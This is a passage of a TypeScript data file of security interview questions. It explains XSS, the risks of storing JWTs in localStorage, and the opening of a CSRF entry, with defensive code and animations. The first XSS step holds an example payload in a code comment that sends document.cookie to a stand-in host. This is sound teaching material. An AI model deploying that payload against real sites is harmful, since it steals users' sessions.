import type { InterviewQuestion } from '../types';

export const cybersecurityQuestions: InterviewQuestion[] = [
  {
    slug: 'xss-attack-and-defense',
    category: 'cybersecurity',
    topic: 'Web Security',
    title: 'How does XSS work, and how do you defend against it?',
    difficulty: 'beginner',
    frequency: 'very-often',
    round: 'concept',
    type: 'concept',
    tags: ['xss', 'csp', 'sanitization', 'output-encoding', 'browser-security'],
    oneLiner:
      'The browser cannot tell your code from an attacker payload — every XSS defense is about keeping data out of the HTML parser.',
    whyAsked:
      'XSS is the canonical web security question because it tests whether you understand the browser trust model instead of just memorizing "escape output". Interviewers listen for the taxonomy — stored, reflected, and DOM-based — plus the difference between encoding and sanitization, and whether you treat CSP and HttpOnly as layers or as the fix. Knowing why the browser cannot distinguish app code from injected script is what separates a memorized answer from a real model.',
    mentalModel:
      'An XSS vulnerability is any path where attacker-controlled data reaches an HTML parser or JavaScript interpreter as syntax instead of data. The browser executes whatever it parses in the page origin, so defense means breaking that path everywhere: context-aware output encoding, sanitization only when HTML must survive, and CSP plus HttpOnly as layers that limit damage when a path is missed.',
    steps: [
      {
        title: 'XSS in one minute',
        body: `Cross-site scripting is not a browser bug; it is a trust bug. When a page renders data as markup, any visitor-supplied string can become executable code, and the browser has no way to know that the script it just parsed came from an attacker rather than the application. All script on a page shares one origin, one DOM, and one cookie jar, so injected code runs with exactly the same privileges as first-party code. Watch the animation: the same comment travels through two pipelines. On the left the server concatenates it into HTML and the parser turns the payload into a live image node whose handler fires. On the right the server encodes it, the browser displays angle brackets as text, and no node is ever created. The lesson is blunt: once attacker data reaches an HTML parser unescaped, the browser cannot save you.`,
        code: {
          language: 'javascript',
          source: `// vulnerable: the payload becomes real markup
el.innerHTML = "<p>" + comment + "</p>";

// attacker comment
// <img src=x onerror="fetch('https://evil.io?c=' + document.cookie)">`,
        },
        animation: {
          kind: 'story',
          cast: [
            { id: 'visitor', icon: '🧑', label: 'Visitor' },
            { id: 'parser', icon: '👨‍🍳', label: 'HTML parser' },
            { id: 'attacker', icon: '🦹', label: 'Sneaky payload' },
          ],
          frames: [
            { id: 'f1', caption: 'A visitor leaves a comment — plain words, it seems. 💬', shout: { text: 'A COMMENT ARRIVES', tone: 'info' }, cast: [{ id: 'visitor', state: 'working' }], tokens: [{ id: 'comment', icon: '💬', label: '“nice post!”', from: 'visitor', to: 'parser' }] },
            { id: 'f2', caption: 'But hiding inside is a broken-picture trick. 🖼️', shout: { text: 'SNEAKY PAYLOAD!', tone: 'bad' }, mood: 'bad', cast: [{ id: 'attacker', state: 'working' }], tokens: [{ id: 'trick', icon: '🖼️', label: 'looks broken', at: 'attacker', effect: 'pop' }] },
            { id: 'f3', caption: 'The parser reads it as REAL instructions, not words. 😨', shout: { text: 'PARSED AS CODE!', tone: 'bad' }, mood: 'bad', cast: [{ id: 'parser', state: 'crashed' }], tokens: [{ id: 'gears', icon: '⚙️', label: 'running it!', at: 'parser', effect: 'burst' }] },
            { id: 'f4', caption: 'The trap fires and grabs the visitor’s cookies. 🍪', shout: { text: 'COOKIES STOLEN!', tone: 'bad' }, mood: 'bad', cast: [{ id: 'attacker', state: 'done' }], tokens: [{ id: 'cookies', icon: '🍪', label: 'gone!', from: 'parser', to: 'attacker' }] },
            { id: 'f5', caption: 'Encoded text is sealed in glass — it can only be read, never obeyed. 🧊', shout: { text: 'DATA STAYS DATA ✓', tone: 'good' }, mood: 'good', cast: [{ id: 'parser', state: 'happy' }], tokens: [{ id: 'glass', icon: '🧊', label: 'escaped', at: 'parser', effect: 'pop' }] },
          ],
        },
      },
      {
        title: 'Stored, reflected, DOM-based',
        body: `The taxonomy answers where the payload enters and where it is rendered. Stored XSS saves the payload first — a comment, profile, or support ticket — so every later viewer is attacked and no special link is needed; this is the most dangerous class. Reflected XSS bounces the payload straight back in the response, usually from a query parameter or form field, so the attacker must deliver a crafted link. DOM-based XSS never involves the server at all: client code copies location.hash or another source into a dangerous sink such as innerHTML, so server-side output encoding cannot help. Watch the animation: all three routes converge on the same outcome, attacker-controlled strings becoming executable markup inside a victim origin. The fix differs by class — encode stored and reflected output at render time, and sanitize or avoid dangerous sinks in client code — which is why naming the class is the first real step of any remediation.`,
        animation: {
          kind: 'story',
          cast: [
            { id: 'stored', icon: '🚪', label: 'Saved door' },
            { id: 'reflected', icon: '🪃', label: 'Boomerang door' },
            { id: 'dom', icon: '🪟', label: 'Window door' },
            { id: 'attacker', icon: '🦹', label: 'The trick' },
          ],
          frames: [
            { id: 'f1', caption: 'Door 1: the trick is SAVED — it greets every later visitor. 🚪', shout: { text: 'SAVED DOOR', tone: 'bad' }, mood: 'bad', cast: [{ id: 'stored', state: 'crashed' }], tokens: [{ id: 'save', icon: '🦹', label: 'stored forever', from: 'attacker', to: 'stored' }] },
            { id: 'f2', caption: 'Door 2: the trick bounces back from a crafted link. 🪃', shout: { text: 'BOOMERANG DOOR', tone: 'bad' }, mood: 'bad', cast: [{ id: 'reflected', state: 'crashed' }], tokens: [{ id: 'bounce', icon: '🦹', label: 'comes right back', at: 'reflected', effect: 'shake' }] },
            { id: 'f3', caption: 'Door 3: the trick never visits the server at all. 🪟', shout: { text: 'WINDOW DOOR', tone: 'bad' }, mood: 'bad', cast: [{ id: 'dom', state: 'crashed' }], tokens: [{ id: 'local', icon: '🦹', label: 'lives in the browser', at: 'dom', effect: 'pop' }] },
            { id: 'f4', caption: 'Three doors, one room: the visitor’s browser. 🎯', shout: { text: 'SAME ROOM!', tone: 'bad' }, mood: 'bad', cast: [{ id: 'attacker', state: 'happy' }], tokens: [{ id: 'map', icon: '🗺️', label: '3 ways in', at: 'attacker', effect: 'pop' }] },
            { id: 'f5', caption: 'Guard every door: clean text where each one opens. 🧼', shout: { text: 'GUARD EVERY DOOR ✓', tone: 'good' }, mood: 'good', cast: [{ id: 'stored', state: 'done' }, { id: 'reflected', state: 'done' }, { id: 'dom', state: 'done' }], tokens: [{ id: 'soap', icon: '🧼', label: 'clean at render', at: 'dom', effect: 'pop' }] },
          ],
        },
      },
      {
        title: 'The vulnerable sink',
        body: `An HTML sink parses strings as markup. element.innerHTML = userComment is the textbook sink: the assignment is instant, the parser builds real element nodes, and handlers such as onerror fire without any click. document.write, insertAdjacentHTML, eval, and template strings passed to dangerouslySetInnerHTML behave the same way. The animation shows the two assignments side by side. On the left the payload becomes an image node whose broken src triggers onerror, and the handler calls the attacker server; on the right textContent inserts the identical string as text, so the angle brackets are visible characters rather than syntax. When rich formatting must be preserved, never hand the raw string to innerHTML — run it through a maintained allowlist sanitizer such as DOMPurify first. The one-line rule worth saying out loud in an interview: data should stay data.`,
        code: {
          language: 'javascript',
          source: `// vulnerable
element.innerHTML = userComment;

// safe: the payload renders as text
element.textContent = userComment;

// rich text still required? sanitize first
element.innerHTML = DOMPurify.sanitize(userComment);`,
        },
        animation: {
          kind: 'story',
          cast: [
            { id: 'builder', icon: '🧱', label: 'Builder box (innerHTML)' },
            { id: 'glass', icon: '🧊', label: 'Glass box (textContent)' },
            { id: 'trick', icon: '🦹', label: 'Trick' },
          ],
          frames: [
            { id: 'f1', caption: 'A comment is about to be placed on the page. 📄', shout: { text: 'PLACE THE COMMENT', tone: 'info' }, cast: [{ id: 'trick', state: 'working' }], tokens: [{ id: 'note', icon: '📄', label: 'the words', at: 'trick', effect: 'pop' }] },
            { id: 'f2', caption: 'Box A reads EVERYTHING as building blocks. 🧱', shout: { text: 'BOX A: BUILDER', tone: 'info' }, cast: [{ id: 'builder', state: 'working' }], tokens: [{ id: 'blocks', icon: '🧱', label: 'builds it', from: 'trick', to: 'builder' }] },
            { id: 'f3', caption: 'The sneaky picture trick gets BUILT for real — and fires! 💥', shout: { text: 'TRAP BUILT!', tone: 'bad' }, mood: 'bad', cast: [{ id: 'builder', state: 'crashed' }], tokens: [{ id: 'boom', icon: '💥', label: 'bang!', at: 'builder', effect: 'burst' }] },
            { id: 'f4', caption: 'Box B only shows the words — nothing gets built. 🧊', shout: { text: 'BOX B: GLASS', tone: 'good' }, mood: 'good', cast: [{ id: 'glass', state: 'done' }], tokens: [{ id: 'safe', icon: '🧊', label: 'just text', at: 'glass', effect: 'pop' }] },
            { id: 'f5', caption: 'Need rich text anyway? Wash it first, then use Box A. 🚿', shout: { text: 'WASH FIRST ✓', tone: 'good' }, mood: 'good', cast: [{ id: 'builder', state: 'happy' }], tokens: [{ id: 'wash', icon: '🚿', label: 'DOMPurify', at: 'builder', effect: 'pop' }] },
          ],
        },
      },
      {
        title: 'Encode for every context',
        body: `Escaping is context-specific, which is why "just escape it" is incomplete advice. A value placed between tags needs HTML entity encoding; inside an attribute it also needs quote encoding; inside a URL it needs percent encoding; and inside a script block it needs a serializer designed for script contexts. JSON.stringify alone is unsafe there: it does not escape <, so a payload containing </script> can break out of the block, and server-rendered script data must escape <, >, and & (or use a serializer built for script contexts). Modern template engines escape automatically for HTML contexts, but they cannot follow a value into a URL or an inline event handler. The animation contrasts string-built HTML — where one bio value is safe in one context and breaks the next — with template interpolation that applies the right encoder per slot. The practical rules are short: never concatenate HTML by hand, let the template engine escape, percent-encode dynamic URL components, and render script data through a serializer that escapes <, >, and & rather than raw JSON.stringify.`,
        code: {
          language: 'javascript',
          source: `// choose the encoder for the destination context
const safeText = escapeHtml(bio);            // HTML body
const safeAttr = escapeHtml(quote(bio));     // attribute value
const safeUrl = encodeURIComponent(bio);     // URL component
const safeJson = JSON.stringify(bio);        // NOT safe alone in <script>: escape <, >, &`,
        },
        animation: {
          kind: 'story',
          cast: [
            { id: 'text', icon: '📝', label: 'Your text' },
            { id: 'body', icon: '🏠', label: 'Body door' },
            { id: 'attr', icon: '🏷️', label: 'Attribute door' },
            { id: 'url', icon: '🔗', label: 'URL door' },
            { id: 'script', icon: '📜', label: 'Script door' },
          ],
          frames: [
            { id: 'f1', caption: 'One guest text, four different doors. 🚪🚪', shout: { text: 'EVERY DOOR, A KEY', tone: 'info' }, cast: [{ id: 'text', state: 'working' }], tokens: [{ id: 'guest', icon: '📝', label: 'bio text', at: 'text', effect: 'pop' }] },
            { id: 'f2', caption: 'Body door: turn < into a harmless lookalike. 🏠', shout: { text: 'BODY: ENTITY KEY', tone: 'info' }, cast: [{ id: 'body', state: 'done' }], tokens: [{ id: 'entity', icon: '🔤', label: '&lt;', from: 'text', to: 'body' }] },
            { id: 'f3', caption: 'Attribute door: lock the quotes shut. 🏷️', shout: { text: 'LOCK THE QUOTES', tone: 'info' }, cast: [{ id: 'attr', state: 'done' }], tokens: [{ id: 'quote', icon: '🔒', label: 'no breakout', at: 'attr', effect: 'pop' }] },
            { id: 'f4', caption: 'URL door: scramble every symbol. 🔗', shout: { text: 'PERCENT-ENCODE', tone: 'info' }, cast: [{ id: 'url', state: 'done' }], tokens: [{ id: 'percent', icon: '%️⃣', label: 'safe link', at: 'url', effect: 'pop' }] },
            { id: 'f5', caption: 'Script door: JSON alone is not enough — use a special serializer. 📜', shout: { text: 'SPECIAL SERIALIZER', tone: 'info' }, cast: [{ id: 'script', state: 'done' }], tokens: [{ id: 'serializer', icon: '🧯', label: 'escape < > &', at: 'script', effect: 'pop' }] },
          ],
        },
      },
      {
        title: 'CSP and HttpOnly limits',
        body: `Defense in depth assumes a bug will slip through. A Content-Security-Policy such as script-src 'self' 'nonce-...' tells the browser to refuse inline and third-party scripts, so a markup injection that produces a blockable script simply does not execute — though the policy must be strict, because unsafe-inline or broad host allowlists defeat it. Trusted Types can additionally force code through a sanitizer before it reaches a dangerous sink. HttpOnly is a different, narrower control: it stops JavaScript from reading a cookie, so an XSS payload cannot silently exfiltrate the session token. It does not stop the XSS itself — the malicious script still runs inside the page and can issue authenticated requests as the user. Watch the animation: CSP blocks the injected script, and even if it ran, document.cookie is empty. Use both, and keep sessions short.`,
        animation: {
          kind: 'story',
          cast: [
            { id: 'guard', icon: '👮', label: 'CSP guard' },
            { id: 'vault', icon: '🍪', label: 'Cookie jar' },
            { id: 'sneak', icon: '🕵️', label: 'Injected script' },
          ],
          frames: [
            { id: 'f1', caption: 'No guard on duty: any script that sneaks in just runs. 🕵️', shout: { text: 'NO GUARD!', tone: 'bad' }, mood: 'bad', cast: [{ id: 'sneak', state: 'working' }], tokens: [{ id: 'creep', icon: '🕵️', label: 'walks in', at: 'guard', effect: 'pop' }] },
            { id: 'f2', caption: 'Hire a strict guard: unknown scripts are refused. 👮', shout: { text: 'STRICT GUARD', tone: 'good' }, mood: 'good', cast: [{ id: 'guard', state: 'working' }], tokens: [{ id: 'deny', icon: '🚫', label: 'not on the list', at: 'guard', effect: 'pop' }] },
            { id: 'f3', caption: 'Even so, hide the cookies in a strongbox. 🔒', shout: { text: 'LOCK THE JAR', tone: 'good' }, mood: 'good', cast: [{ id: 'vault', state: 'locked' }], tokens: [{ id: 'lock', icon: '🔒', label: 'HttpOnly', at: 'vault', effect: 'pop' }] },
            { id: 'f4', caption: 'A sneaky script reaches in — the jar is sealed. 🫙', shout: { text: 'JAR IS EMPTY FOR THEM', tone: 'good' }, mood: 'good', cast: [{ id: 'sneak', state: 'crashed', face: '😤' }], tokens: [{ id: 'empty', icon: '🫙', label: 'nothing to grab', at: 'sneak', effect: 'pop' }] },
            { id: 'f5', caption: 'Guard + strongbox: two locks are safer than one. 🛡️', shout: { text: 'TWO LOCKS ✓', tone: 'good' }, mood: 'good', cast: [{ id: 'guard', state: 'done' }, { id: 'vault', state: 'done' }], tokens: [{ id: 'shield', icon: '🛡️', label: 'defense in depth', at: 'guard', effect: 'pop' }] },
          ],
        },
      },
    ],
    edgeCases: [
      'Sanitizing on input and trusting it forever: stored payloads outlive code, and library fixes change what is dangerous — encode or sanitize again on output.',
      'Blocklisting tags or stripping <script> by hand: mutation XSS slips through naive filters — use a maintained allowlist sanitizer such as DOMPurify.',
      "CSP containing 'unsafe-inline': it re-enables exactly the inline execution you were trying to block — prefer nonces or hashes and drop unsafe sources.",
      'Trusting HttpOnly to stop XSS: the payload still runs and can act as the user — HttpOnly only prevents reading the cookie, so keep the injected script out too.',
      'Forgetting DOM-based sources: location.hash, window.name, and postMessage data flowing into innerHTML are invisible to server-side encoding.',
    ],
    followUps: [
      {
        q: 'What is the difference between output encoding and sanitization?',
        a: 'Encoding converts dangerous characters into inert text for a specific context — always safe, but it destroys markup. Sanitization parses untrusted HTML and removes dangerous parts so safe formatting survives; it is riskier and must use a maintained library.',
      },
      {
        q: 'Why is CSP called defense in depth rather than a fix?',
        a: 'A strict CSP blocks many injected executions, but it must be configured correctly and some payloads work through allowed origins or style tricks. It limits exploitation; it does not remove the injection path.',
      },
      {
        q: 'Does HttpOnly stop XSS?',
        a: 'No. The script still executes in your origin. HttpOnly only stops it from reading cookies, so it limits session-token theft but not actions performed as the user.',
      },
    ],
    relatedEngine: { label: 'Explore the Web Security visualizer', href: '/fullstack/websecurity' },
  },
  {
    slug: 'jwt-localstorage-risk',
    category: 'cybersecurity',
    topic: 'Authentication',
    title: 'Why is storing JWTs in localStorage dangerous?',
    difficulty: 'intermediate',
    frequency: 'very-often',
    round: 'concept',
    type: 'concept',
    tags: ['jwt', 'localstorage', 'httponly', 'cookies', 'token-rotation'],
    oneLiner:
      'A JWT is a bearer token: one XSS payload that reads localStorage silently walks away with an account that stays valid until expiry.',
    whyAsked:
      'Token storage is where authentication design meets XSS, and interviewers use it to see whether you understand JWTs as bearer credentials rather than magic strings. The strongest answers separate what the token is (signed claims), what it represents (possession equals identity), and where it lives (JavaScript-readable storage versus HttpOnly cookies), then name the trade-off each choice creates. The question also opens the door to refresh rotation and revocation, which is where senior candidates stand out.',
    mentalModel:
      'A JWT is a signed, base64url-encoded claim set and a bearer credential: whoever holds the string is treated as the user. localStorage is readable by every script on the origin, so any XSS turns a stored token into silent, valid-until-expiry account takeover. HttpOnly cookies move the credential out of JavaScript reach and have the browser attach it automatically, trading XSS exfiltration for CSRF exposure that SameSite and CSRF tokens must then handle.',
    steps: [
      {
        title: 'Three parts, no secrets',
        body: `A JWT is three base64url segments joined by dots: a header describing the algorithm, a claims payload, and a signature. Base64url is reversible encoding, not encryption, which is the first misconception this question tests. Anyone holding the token can decode the payload and read every claim — user id, role, expiry — and the animation shows exactly that, with the decoded object appearing beside the raw string. What the signature actually buys is integrity: it proves the server issued these claims and that nobody altered them, because forging a valid signature without the key is infeasible — provided the verifier pins the expected algorithm and rejects none; naive verification that trusts the token's own alg header falls to alg-confusion or unsigned-token attacks. It does not encrypt the payload and it does not identify the current holder. The distinction to say out loud in an interview is "signed, not secret" — then explain what that means for storage and trust.`,
        code: {
          language: 'javascript',
          source: `// raw token: header.payload.signature
// eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1XzQ4MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc2MDAwMDAwMH0.9xQ...

// decoded payload (anyone can do this)
JSON.parse(atob('eyJzdWIiOiJ1XzQ4MiIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc2MDAwMDAwMH0'))
// { "sub": "u_482", "role": "admin", "exp": 1760000000 }`,
        },
        animation: {
          kind: 'story',
          cast: [
            { id: 'card', icon: '✉️', label: 'A JWT' },
            { id: 'peek', icon: '👀', label: 'Any reader' },
            { id: 'signer', icon: '✍️', label: 'The signature' },
          ],
          frames: [
            { id: 'f1', caption: 'A JWT is a postcard — not a sealed letter. ✉️', shout: { text: 'NOT SEALED!', tone: 'info' }, cast: [{ id: 'card', state: 'working' }], tokens: [{ id: 'postcard', icon: '✉️', label: 'plain card', at: 'card', effect: 'pop' }] },
            { id: 'f2', caption: 'Anyone who holds it can read every word. 👀', shout: { text: 'EVERYONE CAN READ', tone: 'info' }, cast: [{ id: 'peek', state: 'working' }], tokens: [{ id: 'read', icon: '👀', label: '“role: admin”', from: 'card', to: 'peek' }] },
            { id: 'f3', caption: 'The signature proves who WROTE it — nothing more. ✍️', shout: { text: 'SIGNED, NOT SECRET', tone: 'info' }, cast: [{ id: 'signer', state: 'done' }], tokens: [{ id: 'stamp', icon: '✍️', label: 'genuine', at: 'signer', effect: 'pop' }] },
            { id: 'f4', caption: 'It never says who is HOLDING it! 🤷', shout: { text: 'ANY HOLDER = YOU', tone: 'bad' }, mood: 'bad', cast: [{ id: 'peek', state: 'idle', face: '🦹' }], tokens: [{ id: 'who', icon: '🤷', label: 'no face check', at: 'card', effect: 'float' }] },
            { id: 'f5', caption: 'So treat it like a key — guard it well. 🔑', shout: { text: 'IT IS A KEY', tone: 'info' }, cast: [{ id: 'card', state: 'locked' }], tokens: [{ id: 'key', icon: '🔑', label: 'guard it', at: 'card', effect: 'pop' }] },
          ],
        },
      },
      {
        title: 'A bearer token is a key',
        body: `The word bearer is literal: whoever bears the token gets the access. The server validates the signature and the expiry claim, then trusts the identity inside — it has no way to know whether the request came from the human who logged in or from someone who copied the string. There is no device binding and no session identifier the server can revoke unless you built one. The animation walks through this asymmetry: a thief who obtains the token replays one request and the server treats it as a perfectly valid session, because cryptographically it is one. Two consequences follow. First, guard the token with the same care as a password, especially against XSS. Second, if you need revocation, add server-side state such as a token id denylist or short expiries with rotation, because a stateless JWT cannot be un-issued.`,
        animation: {
          kind: 'story',
          cast: [
            { id: 'door', icon: '🚪', label: 'Account door' },
            { id: 'key', icon: '🔑', label: 'The token' },
            { id: 'thief', icon: '🦹', label: 'Finder' },
          ],
          frames: [
            { id: 'f1', caption: 'The key opens the door — that is all it does. 🔑', shout: { text: 'KEY OPENS DOOR', tone: 'info' }, cast: [{ id: 'door', state: 'working' }], tokens: [{ id: 'use', icon: '🔑', label: 'let me in', at: 'door', effect: 'pop' }] },
            { id: 'f2', caption: 'The door never checks WHO is holding it. 🤷', shout: { text: 'NO FACE CHECK', tone: 'bad' }, mood: 'bad', cast: [{ id: 'door', state: 'crashed' }], tokens: [{ id: 'shrug', icon: '🤷', label: 'trusts anyone', at: 'door', effect: 'pop' }] },
            { id: 'f3', caption: 'A thief who finds the key just walks in. 🦹', shout: { text: 'THIEF WALKS IN!', tone: 'bad' }, mood: 'bad', cast: [{ id: 'thief', state: 'happy' }], tokens: [{ id: 'walk', icon: '🚶', label: 'free entry', from: 'key', to: 'door' }] },
            { id: 'f4', caption: 'Fix: tiny keys that expire fast + a guest list. 📋⏱️', shout: { text: 'SHORT-LIVED KEYS', tone: 'good' }, mood: 'good', cast: [{ id: 'door', state: 'locked' }], tokens: [{ id: 'list', icon: '📋', label: 'who entered?', at: 'door', effect: 'pop' }] },
            { id: 'f5', caption: 'Old key used twice? That is an alarm, not an entry. 🚨', shout: { text: 'REPLAY = ALARM ✓', tone: 'good' }, mood: 'good', cast: [{ id: 'thief', state: 'crashed', face: '😨' }], tokens: [{ id: 'alarm', icon: '🚨', label: 'caught!', at: 'door', effect: 'pop' }] },
          ],
        },
      },
      {
        title: 'localStorage versus HttpOnly cookies',
        body: `This is the heart of the question. localStorage is readable by any JavaScript running on the origin, including a payload planted by a single XSS flaw anywhere on the site. The animation's left pipeline shows the theft end to end: the app stores the access token with localStorage.setItem, an injected script calls getItem, and one outbound fetch sends it to the attacker — no user interaction, no visible trace, and the token remains valid until exp. The right pipeline uses an HttpOnly, Secure, SameSite cookie: the browser stores the credential outside the JavaScript-accessible cookie API, attaches it automatically on requests to the origin, and document.cookie returns an empty string. XSS can still act through the victim's browser, but it cannot walk away with a long-lived credential. That is the trade the next step expands on.`,
        code: {
          language: 'javascript',
          source: `// localStorage: readable by ANY script on the origin
localStorage.setItem('access_token', token);
const stolen = localStorage.getItem('access_token'); // XSS does this

// HttpOnly cookie: out of JavaScript reach
// Set-Cookie: access_token=...; HttpOnly; Secure; SameSite=Lax
document.cookie; // '' — the token is not here`,
        },
        animation: {
          kind: 'story',
          cast: [
            { id: 'table', icon: '🪑', label: 'Open table' },
            { id: 'pocket', icon: '🧥', label: 'Secret pocket' },
            { id: 'thief', icon: '🦹', label: 'Sneaky script' },
          ],
          frames: [
            { id: 'f1', caption: 'Key left on the open table — anyone can grab it. 🪑🔑', shout: { text: 'OPEN TABLE!', tone: 'bad' }, mood: 'bad', cast: [{ id: 'table', state: 'working' }], tokens: [{ id: 'key', icon: '🔑', label: 'token', at: 'table', effect: 'pop' }] },
            { id: 'f2', caption: 'One sneaky script = key gone, account gone. 🦹', shout: { text: 'SILENT THEFT!', tone: 'bad' }, mood: 'bad', cast: [{ id: 'thief', state: 'happy' }], tokens: [{ id: 'steal', icon: '🔑', label: 'mine now', from: 'table', to: 'thief' }] },
            { id: 'f3', caption: 'Better: a secret pocket only the coat can open. 🧥', shout: { text: 'SECRET POCKET', tone: 'good' }, mood: 'good', cast: [{ id: 'pocket', state: 'locked' }], tokens: [{ id: 'safe', icon: '🔑', label: 'hidden away', at: 'pocket', effect: 'pop' }] },
            { id: 'f4', caption: 'Sneaky scripts reach in — nothing to find! 🚫', shout: { text: 'SEALED ✓', tone: 'good' }, mood: 'good', cast: [{ id: 'thief', state: 'crashed', face: '😤' }], tokens: [{ id: 'empty', icon: '🫙', label: 'empty', at: 'thief', effect: 'pop' }] },
            { id: 'f5', caption: 'The coat hands the key to the bank automatically. 🤝', shout: { text: 'AUTO-HANDOFF ✓', tone: 'good' }, mood: 'good', cast: [{ id: 'pocket', state: 'done' }], tokens: [{ id: 'handoff', icon: '🤝', label: 'browser does it', at: 'pocket', effect: 'pop' }] },
          ],
        },
      },
      {
        title: 'Cookies trade XSS for CSRF',
        body: `Moving a token from localStorage into a cookie fixes exfiltration by JavaScript but reintroduces a classic problem: browsers attach cookies automatically based on destination, so another site can cause the victim browser to send authenticated requests. That is CSRF. The mitigation set is well understood — mark cookies Secure so they never travel over plain HTTP, set SameSite=Lax or Strict so cross-site requests do not carry them, and validate an anti-CSRF token on state-changing endpoints. The animation shows the trade directly. On the left, script reads a localStorage token and exfiltrates it; on the right, the cookie never appears in JavaScript, but the browser will volunteer it to bank.com from any tab, which is the exposure you now own. Prefer cookies plus CSRF defenses; the alternative keeps long-lived tokens exactly where a single XSS can steal them.`,
        animation: {
          kind: 'story',
          cast: [
            { id: 'coat', icon: '🧥', label: 'Cookie coat' },
            { id: 'note', icon: '📨', label: 'A request' },
            { id: 'bank', icon: '🏦', label: 'Bank' },
          ],
          frames: [
            { id: 'f1', caption: 'The coat stamps ANY request to the bank — automatically. 🧥', shout: { text: 'AUTO-STAMPER!', tone: 'bad' }, mood: 'bad', cast: [{ id: 'coat', state: 'working' }], tokens: [{ id: 'auto', icon: '🪪', label: 'stamps all', at: 'coat', effect: 'pop' }] },
            { id: 'f2', caption: 'A stranger writes a fake request. 📨', shout: { text: 'FORGED NOTE', tone: 'bad' }, mood: 'bad', cast: [{ id: 'note', state: 'working' }], tokens: [{ id: 'fake', icon: '📨', label: '“send money!”', from: 'note', to: 'coat' }] },
            { id: 'f3', caption: 'The coat stamps it without even asking you! 😱', shout: { text: 'STAMPED ANYWAY!', tone: 'bad' }, mood: 'bad', cast: [{ id: 'bank', state: 'done' }], tokens: [{ id: 'stamped', icon: '🪪', label: 'looks real', from: 'coat', to: 'bank' }] },
            { id: 'f4', caption: 'Fix 1: a “same-site only” badge on the coat. 🏷️', shout: { text: 'SAMESITE BADGE', tone: 'good' }, mood: 'good', cast: [{ id: 'coat', state: 'locked' }], tokens: [{ id: 'badge', icon: '🏷️', label: 'home only', at: 'coat', effect: 'pop' }] },
            { id: 'f5', caption: 'Fix 2: a secret handshake word only your pages know. 🤝', shout: { text: 'SECRET HANDSHAKE ✓', tone: 'good' }, mood: 'good', cast: [{ id: 'bank', state: 'happy' }], tokens: [{ id: 'word', icon: '🤝', label: 'csrf token', at: 'bank', effect: 'pop' }] },
          ],
        },
      },
      {
        title: 'Short-lived tokens, rotating refresh',
        body: `No storage choice removes the need to limit damage. Long-lived access tokens are the worst case: a stolen token stays valuable until its exp, which may be days away. The standard pattern pairs a short-lived access token — roughly five to fifteen minutes — with a refresh token stored in an HttpOnly cookie. When the access token expires, the client calls the refresh endpoint for a new one. Rotation means each refresh issues a new refresh token and invalidates the old one; if an old token is presented twice, the server treats it as theft and revokes the whole session family. The animation contrasts a single month-long token that keeps working after theft with a rotating pair that turns the same theft into a short window and a detectable event. Add a jti denylist or a token version claim when you need immediate revocation on logout.`,
        animation: {
          kind: 'story',
          cast: [
            { id: 'ticket', icon: '🎫', label: 'Access ticket' },
            { id: 'counter', icon: '⏰', label: 'Renewal counter' },
            { id: 'thief', icon: '🦹', label: 'Thief' },
          ],
          frames: [
            { id: 'f1', caption: 'A month-long pass is a thief’s jackpot. 🎰', shout: { text: 'LONG PASS = JACKPOT', tone: 'bad' }, mood: 'bad', cast: [{ id: 'ticket', state: 'crashed' }], tokens: [{ id: 'magnet', icon: '🧲', label: 'steal me', at: 'ticket', effect: 'float' }] },
            { id: 'f2', caption: 'A 10-minute ticket? Barely worth stealing. ⏱️', shout: { text: 'TINY TICKET ✓', tone: 'good' }, mood: 'good', cast: [{ id: 'ticket', state: 'done' }], tokens: [{ id: 'timer', icon: '⏱️', label: 'expires fast', at: 'ticket', effect: 'pop' }] },
            { id: 'f3', caption: 'Need more time? Borrow a renewal at the counter. 🎫', shout: { text: 'RENEW AT COUNTER', tone: 'info' }, cast: [{ id: 'counter', state: 'working' }], tokens: [{ id: 'renew', icon: '🎫', label: 'one more', from: 'counter', to: 'ticket' }] },
            { id: 'f4', caption: 'Every renewal swaps the old one — single use! 🔁', shout: { text: 'ONE USE EACH', tone: 'info' }, cast: [{ id: 'counter', state: 'done' }], tokens: [{ id: 'swap', icon: '🔁', label: 'old one dies', at: 'counter', effect: 'pop' }] },
            { id: 'f5', caption: 'An old renewal used twice? Alarm — and revoke everything. 🚨', shout: { text: 'REPLAY = ALARM ✓', tone: 'good' }, mood: 'good', cast: [{ id: 'thief', state: 'crashed', face: '😨' }], tokens: [{ id: 'siren', icon: '🚨', label: 'family revoked', at: 'counter', effect: 'pop' }] },
          ],
        },
      },
    ],
    edgeCases: [
      'Keeping tokens in memory only: it reduces XSS exposure but loses sessions on refresh — pair it with an HttpOnly refresh cookie or accept re-login.',
      "Using sessionStorage as a safer localStorage: any script on the origin still reads it for the tab's lifetime, so XSS exfiltrates just as easily.",
      'Long-lived access tokens in cookies: HttpOnly stops JavaScript theft, but a leaked cookie stays valid for its full lifetime — keep exp short and rotate.',
      'Refresh rotation without reuse detection: a stolen refresh token can be used forever — detect replay and revoke the entire token family.',
      'Stateless JWTs with no revocation path: logout and password changes cannot un-issue them — add a jti denylist, a token version claim, or both.',
    ],
    followUps: [
      {
        q: 'Is localStorage safe if the app has no XSS?',
        a: 'That is a fragile assumption. One injected dependency, one templating bug, or one third-party script changes the answer, so storage should be defense in depth rather than the primary control.',
      },
      {
        q: 'Cookies or localStorage — which should you choose?',
        a: 'Prefer HttpOnly, Secure, SameSite cookies for credentials and handle the CSRF trade-off with tokens or SameSite=Lax. Use localStorage only for non-credential UI state.',
      },
      {
        q: 'How do you revoke a JWT?',
        a: 'Stateless JWTs cannot be revoked on their own. Use short expiries with refresh rotation and reuse detection, or add server-side state such as a jti denylist or token version.',
      },
    ],
    relatedEngine: { label: 'Explore the Auth visualizer', href: '/fullstack/authviz' },
  },
  {
    slug: 'csrf-how-and-samesite',
    category: 'cybersecurity',
    topic: 'Web Security',
    title: 'How does CSRF work when the attacker cannot read cookies?',
    difficulty: 'intermediate',
    frequency: 'very-often',
    round: 'concept',
    type: 'concept',
    tags: ['csrf', 'samesite', 'cookies', 'csrf-tokens', 'same-origin-policy'],
    oneLiner:
      'The attacker never reads the cookie — the browser volunteers it because cookies follow the destination, not the page that sent you there.',
    whyAsked:
      'CSRF separates people who understand the browser credential model from people who repeat "use a CSRF token". Interviewers probe why the attacker never needs to read the cookie, why the same-origin policy does not help, and whether you know that POST-only APIs and default-Lax cookies change the risk surface without eliminating it. The best answers connect browser policy, server validation, and API design into one story.',
